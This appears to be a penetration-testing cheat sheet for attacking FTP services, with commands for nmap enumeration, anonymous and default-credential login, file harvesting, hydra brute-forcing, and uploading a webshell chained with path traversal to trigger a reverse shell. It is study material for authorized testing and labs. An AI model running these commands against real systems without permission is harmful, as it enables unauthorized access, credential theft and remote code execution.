https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp

### Initial checks

Nmap enumeration:
```bash
nmap --script ftp* -p21 <ip>
```

Check for anonymous login: (different users may have different files)
```bash
ftp anonymous@<IP>
```

**Try `ls -al` to check for hidden files and folders!**

| FTP trick                               | command                             |
| --------------------------------------- | ----------------------------------- |
| Passive mode                            | `passive`, `ls`                     |
| Recursively list files                  | `recurse`, `ls`                     |
| Alternate credentials                   | `ftp:ftp`, `admin:admin`            |
| Transfer binaries                       | `binary`                            |
| Get files recursively                   | `wget -r ftp://<USER>:<PASS>@<IP>/` |
| Try username & machine name as password | e.g. `kiero:kiero`                  |

Banner grabbing:
```bash
nc -vn <IP> 21
```

Check for vulnerabilities:
```bash
searchsploit ftp
```

### Files

Run exiftool to determine possible authors (usernames) and or software on the system.
```bash
exiftool -a <file>
```

### Write permissions

Upload binary or webshell:
```bash
ftp> binary
ftp> put <file>
```
>[!Used for]
>- Executing a reverse shell in the browser
>- LFI? Check config file for document root: `/etc/vsftpd.conf`, use this to execute a revshell
>	- `<URL>?LFI=../../../<PATH>/rev.php`

Upload files and use them for other exploits like redis-rce:
- [[Sybaris]]

### Bruteforce

Bruteforce FTP:
- **Check out SecLists for usernames!**
```bash
hydra -L users -P passwords ftp://<IP> -s 21

hydra -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <IP> ftp
```
